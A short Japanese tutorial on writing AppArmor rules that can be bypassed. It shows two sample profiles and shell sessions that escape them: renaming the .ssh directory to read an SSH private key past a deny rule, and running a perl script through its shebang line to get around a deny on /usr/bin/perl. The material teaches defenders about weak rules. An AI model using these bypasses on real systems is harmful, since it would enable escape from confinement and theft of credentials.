# AppArmor のバイパス方法

AppArmor は記法が複雑であるため、バイパス可能なルールを記述してしまうケースがあります。  
ここでは、いくつかそれらの例を示したいと思います。

## 親ディレクトリを rename する

次のように `mybash` が `.ssh/` 配下のファイルを操作できないようなルールを記述します。

```c
#include <tunables/global>

/home/ubuntu/mybash {
  #include <abstractions/base>
  file,

  deny /home/ubuntu/.ssh/** mrwklx,
}
```

一見問題が無いように見えますが、 `.ssh` を rename することでバイパスできます。

```sh
ubuntu@sandbox:~$ cat .ssh/id_rsa
cat: .ssh/id_rsa: Permission denied
ubuntu@sandbox:~$ mv .ssh .sshx
ubuntu@sandbox:~$ head .sshx/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApQusoFpwaUZ9k8Y8b521n76ImX85uGTtrnMLTK2XDkp+AEj/
```

## shebang を使った bypass

次のように mybash で perl の実行を禁止するとします。

```c
#include <tunables/global>

/home/ubuntu/mybash {
  #include <abstractions/base>
  file,

  deny /usr/bin/perl mrwlx,
}
```

この場合 shebang を使うことで perl の実行が可能です。

```sh
ubuntu@sandbox:~$ cat test.pl
#!/usr/bin/perl

print("hello\n")
ubuntu@sandbox:~$ perl ./test.pl
mybash: /usr/bin/perl: Permission denied
ubuntu@sandbox:~$ ./test.pl
hello
```
